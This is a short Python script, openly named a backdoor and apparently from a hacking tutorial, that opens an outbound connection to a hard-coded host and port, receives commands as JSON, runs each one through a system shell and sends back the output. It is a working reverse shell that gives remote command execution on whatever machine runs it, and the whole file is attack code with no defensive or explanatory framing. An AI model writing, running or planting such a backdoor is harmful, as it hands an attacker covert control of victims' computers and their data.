#!/usr/bin/python

import socket, subprocess, json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = self.connection.recv(1024) # unwrapping
        return json.loads(json_data)

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            # command = self.connection.recv(1024) # buffer size
            command = self.reliable_recieve()
            command_result = self.execute_system_command(command)
            # self.connection.send(command_result)
            self.reliable_send(command_result)

        connection.close()

my_backdoor = Backdoor("192.168.2.106", 4444)
my_backdoor.run()

# Serialization
